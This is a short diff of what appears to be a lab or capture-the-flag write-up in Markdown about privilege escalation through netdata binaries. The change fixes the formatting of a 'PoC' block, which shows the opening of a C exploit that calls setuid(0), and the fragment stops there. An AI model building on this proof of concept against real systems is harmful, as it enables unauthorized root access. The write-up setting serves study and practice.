@@ -255,7 +255,7 @@ Searching for each of the netdata binaries along with privesc leads you to:
 > [!bug]+ PoC
 > ```c
 > #include <unistd.h>
-#include <stdlib.h>
+> #include <stdlib.h>
 >
 >int main() {
  >       setuid(0);
